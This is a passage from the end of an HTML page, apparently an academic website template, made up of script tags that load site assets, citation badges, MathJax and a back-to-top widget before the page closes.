crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
